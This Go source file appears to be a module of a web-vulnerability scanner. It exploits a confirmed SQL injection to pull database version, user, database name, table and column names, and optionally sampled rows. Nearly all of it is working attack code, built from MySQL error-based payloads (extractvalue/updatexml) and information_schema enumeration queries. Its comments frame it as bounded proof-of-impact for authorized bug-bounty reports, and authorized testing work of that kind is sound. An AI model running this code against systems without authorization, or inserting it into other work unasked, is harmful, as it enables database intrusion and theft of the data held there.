// Package sqldumper performs BOUNDED, proof-of-impact data extraction against
// an endpoint already confirmed to be SQL-injectable. Its purpose is to
// demonstrate the real impact of an injection for an authorized report, not
// to exfiltrate data.
//
// By design it is data-minimizing:
//   - It extracts database METADATA by default: version, current user,
//     current database, and (bounded) table and column names.
//   - It extracts actual ROW data only when Options.SampleData is true, and
//     then at most Options.MaxRows rows, clearly marked as a truncated
//     sample. This mirrors what a responsible engagement needs (prove the
//     bug) while respecting bug-bounty data-minimization rules.
//
// Extraction techniques are error-based (MySQL extractvalue/updatexml) with a
// best-effort UNION-based fallback. All requests go through the shared,
// scope-enforced HTTP client.
package sqldumper

import (
	"context"
	"encoding/hex"
	"fmt"
	"net/http"
	"net/url"
	"regexp"
	"strings"
	"time"

	"github.com/reyjayswa/asfasf/internal/checks"
	"github.com/reyjayswa/asfasf/internal/httpclient"
)

// Options bounds every extraction step. Zero values fall back to conservative
// defaults; SampleData must be explicitly enabled to read any row data.
type Options struct {
	MaxTables  int
	MaxColumns int
	MaxRows    int
	SampleData bool
}

func (o Options) withDefaults() Options {
	if o.MaxTables <= 0 {
		o.MaxTables = 20
	}
	if o.MaxColumns <= 0 {
		o.MaxColumns = 20
	}
	if o.MaxRows <= 0 {
		o.MaxRows = 5
	}
	return o
}

// Checker extracts bounded proof-of-impact data.
type Checker struct {
	client *httpclient.Client
	opts   Options
}

// New builds a dumper Checker with bounded options.
func New(client *httpclient.Client, opts Options) *Checker {
	return &Checker{client: client, opts: opts.withDefaults()}
}

// Name identifies the module.
func (c *Checker) Name() string { return "sql-dumper" }

// markerRe captures the value MySQL leaks between our 0x7e (~) sentinel and
// the closing quote of an XPATH error message.
var markerRe = regexp.MustCompile(`~([^'"]{1,200})`)

// Dump attempts bounded extraction against a confirmed-injectable param.
// It returns nil if nothing could be extracted (the SQLi finding still stands).
func (c *Checker) Dump(ctx context.Context, ep checks.Endpoint, param string) []checks.Finding {
	version, okV := c.extract(ctx, ep, param, "SELECT version()")
	user, _ := c.extract(ctx, ep, param, "SELECT current_user()")
	db, okD := c.extract(ctx, ep, param, "SELECT database()")

	// If we cannot even read the version, extraction is not working here.
	if !okV && !okD {
		return nil
	}

	var findings []checks.Finding
	findings = append(findings, checks.Finding{
		Type:        "sql-dumper",
		Severity:    checks.SeverityCritical,
		Title:       "SQL injection impact confirmed — database metadata extracted",
		URL:         ep.URL,
		Method:      ep.Method,
		Parameter:   param,
		Payload:     "extractvalue(1,concat(0x7e,(SELECT version())))",
		Evidence:    checks.Truncate(fmt.Sprintf("version=%q user=%q database=%q", version, user, db), 240),
		Description: "The injection was exploited to read database metadata out-of-band, proving it is a genuine, high-impact SQL injection rather than a false positive.",
		Remediation: "Use parameterized queries / prepared statements. Rotate any credentials that may have been exposed and review database access controls.",
		Confidence:  "firm",
		Timestamp:   time.Now(),
	})

	// Enumerate table names (bounded).
	tables := c.enumerate(ctx, ep, param,
		"SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT %d,1",
		c.opts.MaxTables)

	// Enumerate columns of the first table (bounded), if any.
	var firstTable string
	var columns []string
	if len(tables) > 0 {
		firstTable = tables[0]
		columns = c.enumerate(ctx, ep, param,
			"SELECT column_name FROM information_schema.columns WHERE table_schema=database() AND table_name="+
				toHex(firstTable)+" LIMIT %d,1",
			c.opts.MaxColumns)
	}

	if len(tables) > 0 {
		ev := fmt.Sprintf("tables (%d shown, cap %d): %s", len(tables), c.opts.MaxTables, strings.Join(tables, ", "))
		if len(columns) > 0 {
			ev += fmt.Sprintf(" | %s columns: %s", firstTable, strings.Join(columns, ", "))
		}
		findings = append(findings, checks.Finding{
			Type:        "sql-dumper",
			Severity:    checks.SeverityHigh,
			Title:       "Database schema enumerated via SQL injection",
			URL:         ep.URL,
			Method:      ep.Method,
			Parameter:   param,
			Evidence:    checks.Truncate(ev, 240),
			Description: "Table and column names were enumerated through the injection. Enumeration is capped to avoid excessive requests and data exposure.",
			Remediation: "Use parameterized queries / prepared statements and apply least-privilege database accounts.",
			Confidence:  "firm",
			Timestamp:   time.Now(),
		})
	}

	// Row sampling is OFF unless explicitly enabled, and is strictly bounded.
	if c.opts.SampleData && firstTable != "" && len(columns) > 0 {
		col := columns[0]
		rows := c.enumerate(ctx, ep, param,
			"SELECT "+col+" FROM "+firstTable+" LIMIT %d,1", c.opts.MaxRows)
		if len(rows) > 0 {
			findings = append(findings, checks.Finding{
				Type:        "sql-dumper",
				Severity:    checks.SeverityCritical,
				Title:       "Bounded sample of row data extracted (data minimization applied)",
				URL:         ep.URL,
				Method:      ep.Method,
				Parameter:   param,
				Evidence:    checks.Truncate(fmt.Sprintf("%s.%s (max %d rows): %s", firstTable, col, c.opts.MaxRows, strings.Join(rows, " | ")), 240),
				Description: "A small, capped sample of real row data was read to demonstrate impact. Do not extract more than needed to prove the finding; follow the program's data-handling rules.",
				Remediation: "Use parameterized queries / prepared statements. Treat any sampled data as sensitive and delete it after reporting.",
				Confidence:  "firm",
				Timestamp:   time.Now(),
			})
		}
	}

	return findings
}

// enumerate pulls up to limit single values using a LIMIT offset,1 subquery
// template (one "%d" for the offset). It stops at the first empty/failed read
// or on a repeat, and always respects the limit and context cancellation.
func (c *Checker) enumerate(ctx context.Context, ep checks.Endpoint, param, tmpl string, limit int) []string {
	var out []string
	seen := map[string]bool{}
	for i := 0; i < limit; i++ {
		if ctx.Err() != nil {
			break
		}
		v, ok := c.extract(ctx, ep, param, fmt.Sprintf(tmpl, i))
		if !ok || v == "" || seen[v] {
			break
		}
		seen[v] = true
		out = append(out, v)
	}
	return out
}

// extract leaks a single scalar subquery result via an error-based payload.
func (c *Checker) extract(ctx context.Context, ep checks.Endpoint, param, subquery string) (string, bool) {
	payloads := []string{
		"1 AND extractvalue(1,concat(0x7e,(" + subquery + ")))",
		"1 AND updatexml(1,concat(0x7e,(" + subquery + ")),1)",
	}
	for _, p := range payloads {
		if ctx.Err() != nil {
			return "", false
		}
		resp, err := c.send(ctx, ep, param, p)
		if err != nil || resp == nil {
			continue
		}
		if m := markerRe.FindStringSubmatch(resp.BodyString()); len(m) >= 2 {
			v := strings.TrimSpace(m[1])
			if v != "" {
				return v, true
			}
		}
	}
	return "", false
}

// send injects payload into param and issues the endpoint's request.
func (c *Checker) send(ctx context.Context, ep checks.Endpoint, param, payload string) (*httpclient.Response, error) {
	values := url.Values{}
	for _, p := range ep.Params {
		if p == param {
			values.Set(p, payload)
		} else {
			values.Set(p, "1")
		}
	}
	if len(ep.Params) == 0 {
		values.Set(param, payload)
	}
	if ep.Method == http.MethodPost {
		return c.client.PostForm(ctx, ep.URL, values.Encode())
	}
	sep := "?"
	if strings.Contains(ep.URL, "?") {
		sep = "&"
	}
	return c.client.Get(ctx, ep.URL+sep+values.Encode())
}

// toHex renders a string as a MySQL 0x... literal so it needs no quoting.
func toHex(s string) string {
	return "0x" + hex.EncodeToString([]byte(s))
}
